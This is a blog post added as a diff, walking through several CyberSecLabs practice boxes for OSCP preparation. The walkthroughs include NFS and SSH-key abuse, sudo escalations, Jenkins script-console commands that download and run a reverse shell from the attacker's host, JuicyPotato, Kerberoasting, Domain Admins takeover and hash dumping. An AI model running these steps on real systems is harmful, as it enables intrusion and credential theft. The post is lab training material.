@@ -1,0 +1,347 @@
+---
+layout: post
+title:  "OSCP Preparation"
+date:   2020-07-09 20:05:48 +0100
+categories: oscp
+---
+
+I recently saw on discord someone mention their OSCP prerperation. On this list there was a resource named [CyberSecLabs](https://www.cyberseclabs.co.uk/), I have never heard of this before so I figured I would create an account and try to complete all the boxes on there.
+
+## Roast
+
+### NMAP
+```
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-10 11:40 BST
+Nmap scan report for 172.31.1.7
+Host is up (0.13s latency).
+
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+2049/tcp  open  nfs_acl 3 (RPC #100227)
+27853/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds
+```
+
+Port 2049 is oipen so the first thing to check for is mountable [shares](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting).
+### Mounting NFS share
+```
+showmount -e 172.31.1.7
+
+Export list for 172.31.1.7:
+/home/amir *.*.*.*
+
+Now we can mount the share we found with showmount:
+
+sudo mount -t nfs 172.31.1.7:/home/amir /mnt/amir -o nolock
+```
+
+### Mounted share
+```
+/mnt/amir]
+└──╼ $find
+.
+./.bashrc
+./.gnupg
+find: ‘./.gnupg/private-keys-v1.d’: Permission denied
+./.gnupg/private-keys-v1.d
+./.sudo_as_admin_successful
+./.profile
+./.cache
+find: ‘./.cache/motd.legal-displayed’: Permission denied
+./.cache/motd.legal-displayed
+./.bash_logout
+./.viminfo
+./.bash_history
+./.ssh
+./.ssh/id_rsa.bak
+./.ssh/id_rsa
+./.ssh/id_rsa.pub
+./.ssh/authorized_keys
+```
+
+### SSH
+```
+Use ssh2john to create a hash that we can crack for the password to the key:
+/opt/JohnTheRipper/run/ssh2john.py id_rsa > ~/ctf/cyberseclab/beginner/shares/hash
+
+Find the password with john and rockyou.txt wordlist: hello6 
+
+
+Connect via the ssh port:
+ssh -i id_rsa amir@172.31.1.7 -p 27853
+```
+
+### Priv esc
+```
+amir@shares:~$ sudo -l
+Matching Defaults entries for amir on shares:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User amir may run the following commands on shares:
+    (ALL : ALL) ALL
+    (amy) NOPASSWD: /usr/bin/pkexec
+    (amy) NOPASSWD: /usr/bin/python3
+
+We can exploit python3 here to spawn a shell:
+
+sudo -u amy python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+Now onto amy priv esc:
+```
+amy@shares:~$ sudo -l
+Matching Defaults entries for amy on shares:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User amy may run the following commands on shares:
+    (ALL) NOPASSWD: /usr/bin/ssh
+
+We can exploit sudo ssh with the command:
+
+
+amy@shares:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+# whoami
+root
+```
+
+A pretty simple box, the only hangup is how long it takes to find the ssh port on nmap, bit of a meme and turns a 5 minute box into a waiting game.
+
+
+## POTATO
+
+
+
+
+### Jenkins
+### NMAP
+```
+Nmap scan report for 172.31.1.19
+Host is up, received user-set (0.18s latency).
+Scanned at 2020-07-10 11:49:40 BST for 1386s
+Not shown: 65521 closed ports
+Reason: 65521 resets
+PORT      STATE SERVICE            REASON          VERSION
+135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
+5985/tcp  open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8080/tcp  open  http               syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
+47001/tcp open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
+49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
+49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
+49155/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
+49162/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
+49163/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
+49164/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT       ADDRESS
+1   176.29 ms 10.10.0.1
+2   176.38 ms 172.31.1.19
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jul 10 12:12:46 2020 -- 1 IP address (1 host up) scanned in 1386.90 seconds
+```
+From the nmap scan we can see a HTTP Server running on port 8080. At this port there is a version of Jenkins running on it. To log in simply use the credentials "admin:admin"
+
+Once logged in we can head to "/script" to start running commands on the box.
+
+Upload shell.exe to the box:
+```
+def command = """powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.1.63/shell.exe', 'C:/Windows/Tasks/shell.exe') """
+def proc = command.execute()
+proc.waitFor()
+
+println "return code: ${ proc.exitValue()}"
+println "stderr: ${proc.err.text}"
+println "stdout: ${proc.in.text}"
+```
+Run shell.exe from jenkins to get a shell
+```
+def command = """C:/Windows/Tasks/shell.exe"""
+def proc = command.execute()
+proc.waitFor()
+
+println "return code: ${ proc.exitValue()}"
+println "stderr: ${proc.err.text}"
+println "stdout: ${proc.in.text}"
+```
+
+### Priv Esc
+```
+C:\Users\ben\Desktop>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabl
+```
+### SeImpersonatePrivilege
+With this privelege we can use the Juicy potato exploit. This can be found [here](https://github.com/ohpe/juicy-potato)
+```
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.1.63/Juicy.Potato.x86.exe', 'C:\Windows\Tasks\juicy.exe')
+```
+With juicy potato uploaded to the server we can find a correct CSLID for the process we want to escalate to. We can find a bunch of CSLID's for the OS [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter).
+
+Since we already have our shell.exe on the box, we can use juicy to run our reverse shell and have a shell as SYSTEM
+```
+C:\windows\tasks\juicy.exe -l 1337 -p C:\windows\tasks\shell.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
+```
+
+
+### Conclusion
+
+The first 2 beginner machines I have found here are comparable to the advanced or advanced+ machines found at VHL. Pretty simple, no issues.
+
+I'll go from here to the 2 free "challenge" machines to see how they compare in difficulty.
+
+
+## Roast
+
+### NMAP
+```
+Nmap scan report for 172.31.3.2
+Host is up, received user-set (0.13s latency).
+Scanned at 2020-07-10 16:10:04 BST for 1768s
+Not shown: 65514 filtered ports
+Reason: 65514 no-responses
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain?       syn-ack ttl 127
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-07-10 15:28:19Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: roast.csl, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 127
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: roast.csl, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack ttl 127
+3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49761/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+
+TRACEROUTE (using port 3389/tcp)
+HOP RTT       ADDRESS
+1   137.76 ms 10.10.0.1
+2   137.04 ms 172.31.3.2
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jul 10 16:39:32 2020 -- 1 IP address (1 host up) scanned in 1768.58 seconds
+```
+
+
+### LDAPSearch
+```
+ldap-search: 
+|         cn: David Smith
+|         sn: Smith
+|         description: Your Password is WelcomeToR04st
+|         sAMAccountName: dsmith
+|         sAMAccountType: 805306368
+|         userPrincipalName: dsmith@roast.csl
+|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=roast,DC=csl
+|         dSCorePropagationData: 2020/05/15 06:46:18 UTC
+|         dSCorePropagationData: 2020/05/15 06:38:02 UTC
+|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
+|         lastLogonTimestamp: 2020-05-15T20:53:26+00:00
+|     dn: CN=Cody Rhodes,OU=Roast,DC=roast,DC=csl
+|         sAMAccountName: crhodes
+|         sAMAccountType: 805306368
+|         userPrincipalName: crhodes@roast.csl
+|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=roast,DC=csl
+|         dSCorePropagationData: 2020/05/15 06:46:18 UTC
+|         dSCorePropagationData: 2020/05/15 06:37:46 UTC
+|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
+|         lastLogonTimestamp: 2020-05-15T05:59:36+00:00
+|     dn: CN=Steve Smith,OU=Roast,DC=roast,DC=csl
+|         sAMAccountName: ssmith
+|         sAMAccountType: 805306368
+|         userPrincipalName: ssmith@roast.csl
+|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=roast,DC=csl
+|         dSCorePropagationData: 2020/05/15 06:46:18 UTC
+|         dSCorePropagationData: 2020/05/15 06:38:17 UTC
+|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
+|_    dn: CN=Roast Svc,OU=Roast,DC=roast,DC=csl
+|_sslv2-drown: 
+Service Info: Host: ROAST; OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+In the description on LDAP search for the user dsmith there is a password: WelcomeToR04st
+It worked with the user dsmith, but I couldn't log in over winrm with this user.
+
+Now we can just try it against the other users to find that we can login with "crhodes:WelcomeToR04st"
+```
+evil-winrm -i 172.31.3.2 -u crhodes -p "WelcomeToR04st" -s ~/ctf/cyberseclab/challenge/roast/scripts
+```
+Since this is an AD box, I'll run sharphound and see if we can see anything in Bloodhound that we can use to privesc.
+
+### PRIV ESC
+
+```
+GetUserSPNs.py roast.csl/crhodes:WelcomeToR04st -dc-ip 172.31.3.2 -request -outputfile hash
+Impacket v0.9.22.dev1+20200605.133909.874d7ae4 - Copyright 2020 SecureAuth Corporation
+
+ServicePrincipalName  Name      MemberOf                                               PasswordLastSet             LastLogon  Delegation 
+--------------------  --------  -----------------------------------------------------  --------------------------  ---------  ----------
+roast/ROAST           roastsvc  CN=Remote Management Users,CN=Builtin,DC=roast,DC=csl  2020-05-15 07:35:50.302845  <never> 
+
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+!!!watermelon245 (?)
+1g 0:00:00:09 DONE (2020-07-10 17:46) 0.1017g/s 1459Kp/s 1459Kc/s 1459KC/s !!12Honey..*7¡Vamos!
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed          
+```
+
+Now we can log in to user roastsvc.
+```
+evil-winrm -i 172.31.3.2 -u roastsvc -s ~/ctf/cyberseclab/challenge/roast/scripts -e ~/ctf/cyberseclab/challenge/roast/exe
+Enter Password:
+```
+From Bloodhound we were able to see that roastsvc has GenericWrite/GenericAll privelege to the Domain Admins group. With this we can add ourselves to the group and dump the hashes of the users on the machine.
+```
+*Evil-WinRM* PS C:\Users\roastsvc\Documents> net group "Domain Admins" roastsvc /add
+
+The command completed successfully.
+```
+Now we are part of the group we can run secretsdump to get the hashes
+```
+secretsdump.py roast.csl/roastsvc@roast.csl -dc-ip 172.31.3.2
+
+roast.csl\dsmith:1103:aad3b435b51404eeaad3b435b51404ee:a0a8160111b21d48d2e816f4cc8da053:::
+roast.csl\crhodes:1104:aad3b435b51404eeaad3b435b51404ee:a0a8160111b21d48d2e816f4cc8da053:::
+roast.csl\ssmith:1105:aad3b435b51404eeaad3b435b51404ee:23991f3cd665b0bc1f7cccfd62506161:::
+roast.csl\roastsvc:1106:aad3b435b51404eeaad3b435b51404ee:2f77331cfd7b2142b3a86a7d2ce7e824:::
+```
+With the hash we can log into the Administrator account and grab the flag
+```
+evil-winrm -i 172.31.3.2 -u Administrator -H f6861a8cfc1c3b9f3ff39a8adb6bd388
+```
+
+Didn't have too much time to do the last box so I'll continue this tomorrow and possibly do start the pay2play machines.
